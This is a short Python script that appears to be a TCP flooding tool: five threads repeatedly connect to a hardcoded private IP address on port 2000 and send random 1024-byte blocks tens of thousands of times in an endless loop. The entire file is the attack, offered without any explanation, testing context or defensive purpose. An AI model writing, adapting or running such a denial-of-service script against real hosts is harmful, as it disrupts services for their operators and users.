import random
import socket
import threading

ip = "172.21.210.74"
port = 2000
times = 50000
threads = 5

def run():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("[!] Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()